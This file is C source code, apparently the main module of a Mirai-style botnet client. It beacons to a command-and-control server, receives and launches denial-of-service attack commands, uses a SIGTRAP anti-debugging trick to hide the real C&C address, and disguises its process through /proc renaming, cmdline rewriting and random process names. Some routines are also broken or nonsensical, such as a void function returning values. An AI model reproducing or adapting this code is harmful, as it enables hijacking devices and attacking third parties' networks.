#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/poll.h>
#include <time.h>
#include <errno.h>
#include <string.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/attack.h"
#include "headers/resolv.h"
#include "headers/killer.h"
#include "headers/tcp.h"
#include "headers/util.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;


ipv4_t LOCAL_ADDR;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("[main/err]: got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif

void main_verify_cnc(char *bot_name, uint8_t id_len) {

    uint8_t pkt[4 + 32] = {0};

    util_memcpy(pkt, "\x00\x00\x00\x01", 4);
    util_memcpy(pkt + 4, &id_len, sizeof(uint8_t));
    util_strcpy(pkt + 4 + sizeof(uint8_t), bot_name);

#ifdef DEBUG
    printf("[main] FD%d Sending verify packet len 0x%02x\n", fd_serv, 4 + sizeof(uint8_t) + id_len);
#endif

    send(fd_serv, pkt, 4 + sizeof(uint8_t) + id_len, MSG_NOSIGNAL);
}
#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define LOCALHOST (INET_ADDR(127,0,0,1))
uint32_t LOCAL_ADDR2;
static void ensure_bind(uint32_t bind_addr)
{
    int fd = -1;
    struct sockaddr_in addr;
    int ret = 0;
    int e = 0;
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
    {
        return;
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(58459);
    addr.sin_addr.s_addr = bind_addr;
    NONBLOCK(fd);
    errno = 0;
    ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    e = errno;

    if(ret == -1 && e == EADDRNOTAVAIL)
    {
        close(fd);
        sleep(1);
        ensure_bind(LOCALHOST);
        return;
    }
    if(ret == -1 && EADDRINUSE)
    {
        exit(1);
    }
    listen(fd, 1);
    return;
}
void hide_process_from_proc(int pid) {
    char new_dir_path[256];
    snprintf(new_dir_path, sizeof(new_dir_path), "/proc/%d", pid);

    rename("/proc/self", new_dir_path);
}
#define MAX_CMDLINE_LENGTH 256

void hide_process() {
    rand_init();

    const char* charset = "abcdefghijklmnopqrstuvwxyz";
    char cmdline_name[MAX_CMDLINE_LENGTH];
    for (int i = 0; i < 10; i++) {
        int index = rand() % strlen(charset);
        cmdline_name[i] = charset[index];
    }
    cmdline_name[10] = '\0';


    pid_t pid = getpid();


    char link_path[32];
    char hidden_path[32];
    snprintf(link_path, sizeof(link_path), "/proc/%d/exe", pid);
    snprintf(hidden_path, sizeof(hidden_path), "/tmp/%s", cmdline_name);
    symlink(hidden_path, link_path);


    char new_cmdline[MAX_CMDLINE_LENGTH];
    snprintf(new_cmdline, sizeof(new_cmdline), "%s%c", hidden_path, '\0');
    int cmdline_fd = open("/proc/self/cmdline", O_WRONLY);
    if (cmdline_fd != -1) {
        write(cmdline_fd, new_cmdline, strlen(new_cmdline));
        close(cmdline_fd);
    }

}

void test(){


    char binaryPath[256];
    ssize_t bytesRead = readlink("/proc/self/exe", binaryPath, sizeof(binaryPath) - 1);
    if (bytesRead == -1) {

        return 1;
    }
    binaryPath[bytesRead] = '\0';


    char binaryPathCopy[256];
    strncpy(binaryPathCopy, binaryPath, sizeof(binaryPathCopy));
    binaryPathCopy[sizeof(binaryPathCopy) - 1] = '\0';


    char* binaryDirectory = dirname(binaryPathCopy);


    char binaryPathCopy2[256];
    strncpy(binaryPathCopy2, binaryPath, sizeof(binaryPathCopy2));
    binaryPathCopy2[sizeof(binaryPathCopy2) - 1] = '\0';


    char* binaryName = basename(binaryPathCopy2);


    char filePath[256];
    snprintf(filePath, sizeof(filePath), "%s/%s", binaryDirectory, binaryName);

    int originalFd = open(filePath, O_RDONLY);
    if (originalFd == -1) {

        return 1;
    }


    char tempFilePath[] = "/tmp/tempXXXXXX";
    int tempFd = mkstemp(tempFilePath);
    if (tempFd == -1) {

        close(originalFd);
        return 1;
    }


    char buffer[4096];
    ssize_t bytesWritten;
    while ((bytesRead = read(originalFd, buffer, sizeof(buffer))) > 0) {
        bytesWritten = write(tempFd, buffer, bytesRead);
        if (bytesWritten != bytesRead) {

            close(originalFd);
            close(tempFd);
            unlink(tempFilePath);
            return 1;
        }
    }


    close(originalFd);
    close(tempFd);


    if (rename(tempFilePath, filePath) == -1) {

        close(tempFd);
        unlink(tempFilePath);
        return 1;
    }

    char updatedFilePath[256];
    snprintf(updatedFilePath, sizeof(updatedFilePath), "%s/%s", binaryDirectory, binaryName);


    if (chmod(updatedFilePath, 0644) == -1) {

    return 1;
    }



}

int main(int argc, char **args)
{
    char *tbl_exec_succ, id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0, i;
    uint8_t name_buf[32];

    #ifndef DEBUG
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
    #endif

    #ifdef DEBUG
        printf("[main/init]: debug (pid: %d)\n", getpid());

        sleep(1);

        struct sigaction sa;

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGSEGV, &sa, NULL) == -1)
            perror("sigaction");

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGBUS, &sa, NULL) == -1)
            perror("sigaction");
    #endif
    
    test();
    
    int lol = getpid();
    hide_process_from_proc(lol);
    
    hide_process();
    
    ensure_bind(LOCAL_ADDR2);
    


    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    rand_init();
    anti_gdb_entry(0);

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    

    util_strcpy(args[0], "");

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;

    prctl(PR_SET_NAME, "a");
    /**/
    util_zero(name_buf, 32);

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);
    /**/
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
    duck_start();

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[main/conn]: select() (errno: %d)\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[main/conn]: timed out while connecting to C&C\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                int n = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0 || n != 0)
                {
#ifdef DEBUG
                    printf("[main/conn]: error while connecting to C&C (errno: %d)\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();

                    if (id_len > 0)
                        main_verify_cnc(id_buf, id_len);
#ifdef DEBUG
                    printf("[main/conn]: connected to C&C (addr: %d)\n", LOCAL_ADDR);
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main/conn]: lost connection with C&C (errno: %d, stat: 1)\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);

            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main/conn]: lost connection with C&C (errno: %d, stat: 2)\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            if (len == 0) {
                continue;
            }

#ifdef DEBUG
            printf("[main/conn]: received bytes from C&C (len: %d)\n", len);
#endif
            if (n <= 0) {
    #ifdef DEBUG
                printf("[main/recv]: recv() failed, closing fd_serv\n");
    #endif
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            struct Attack attack;
            if (attack_parse((const char*)rdbuf, len, &attack) == 0) {
                attack_start(attack.duration, attack.vector, attack.targs_len, attack.targs, attack.opts_len, attack.opts);
                free(attack.targs);
            } else {
                 #ifdef DEBUG
                 printf("[main/conn]: unable to parse attack information\n");
                 #endif
            }
        }
    }
    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    srv_addr.sin_addr.s_addr = CNC_IP;
    srv_addr.sin_port = htons(CNC_PORT);
    srv_addr.sin_family = AF_INET; /* who guarantees this is even ipv4 traffic if we dont set it to be lol */
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main/conn]: attempting to connect to cnc\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main/conn]: failed to call socket() (errno: %d)\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main/teardown]: tearing down connection to C&C!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[main/instance]: another instance is already running, killing ourself (errno: %d)\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main/err]: failed to connect to fd_ctrl to request process termination\n");
#endif
        }

        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main/err]: failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf("[main/instance]: we are the only process on this system\n");
#endif
    }
}
